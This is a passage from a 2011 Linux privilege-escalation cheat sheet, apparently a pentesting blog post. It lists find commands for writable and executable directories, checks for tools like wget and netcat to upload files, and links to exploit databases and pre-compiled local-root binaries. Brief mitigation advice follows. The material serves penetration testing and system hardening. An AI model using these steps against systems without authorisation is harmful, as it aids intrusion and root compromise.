\; 2&gt;/dev/null<br />Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm<br /><br /><br />find / -writable -type d 2&gt;/dev/null      # world-writeable folders<br />find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders<br />find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders<br /><br />find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders<br /><br />find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders<br />Any "problem" files? Word-writeable, "nobody" files<br /><br /><br />find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files<br />find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files<br />Preparation &amp; Finding Exploit Code<br /><br />What development tools/languages are installed/supported?<br /><br />find / -name perl*<br />find / -name python*<br />find / -name gcc*<br />find / -name cc<br />How can files be uploaded?<br /><br />1<br />2<br />3<br />4<br />5<br />find / -name wget<br />find / -name nc*<br />find / -name netcat*<br />find / -name tftp*<br />find / -name ftp<br />Finding exploit code<br /><br />http://www.exploit-db.com<br /><br />http://1337day.com<br /><br />http://www.securiteam.com<br /><br />http://www.securityfocus.com<br /><br />http://www.exploitsearch.net<br /><br />http://metasploit.com/modules/<br /><br />http://securityreason.com<br /><br />http://seclists.org/fulldisclosure/<br /><br />http://www.google.com<br /><br />Finding more information regarding the exploit<br /><br />http://www.cvedetails.com<br /><br />http://packetstormsecurity.org/files/cve/[CVE]<br /><br />http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]<br /><br />http://www.vulnview.com/cve-details.php?cvename=[CVE]<br /><br />(Quick) "Common" exploits. Warning. Pre-compiled binaries files. Use at your own risk<br /><br />http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/<br /><br />http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/<br /><br />Mitigations<br /><br />Is any of the above information easy to find?<br /><br />Try doing it! Setup a cron job which automates script(s) and/or 3rd party products<br /><br />Is the system fully patched?<br /><br />Kernel, operating system, all applications, their plugins and web services<br /><br />1<br />2<br />apt-get update &amp;&amp; apt-get upgrade<br />yum update<br />Are services running with the minimum level of privileges required?<br /><br />For example, do you need to run MySQL as root?<br /><br />Scripts Can any of this be automated?!<br /><br />http://pentestmonkey.net/tools/unix-privesc-check/<br /><br />http://labs.portcullis.co.uk/application/enum4linux/<br /><br />http://bastille-linux.sourceforge.net<br /><br />Other (quick) guides &amp; Links<br /><br />Enumeration<br /><br />http://www.0daysecurity.com/penetration-testing/enumeration.html<br /><br />http://www.microloft.co.uk/hacking/hacking3.htm<br /><br />Misc<br /><br />http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf<br /><br />http://pentest.cryptocity.net/files/operations/2009/post_exploitation_fall09.pdf<br /><br />http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html<br /><br />Posted by g0tmi1kAug 2nd, 2011 12:00 am bypassing, commands, privilege escalation<br /><br />« Pentesting With BackTrack (PWB) + Offensive Security Certified Professional (OSCP)De-ICE.net v1.2a (1.20a) {Level 1 - Disk 3 - Version A} »<br /><br /></div></div>
</body></html>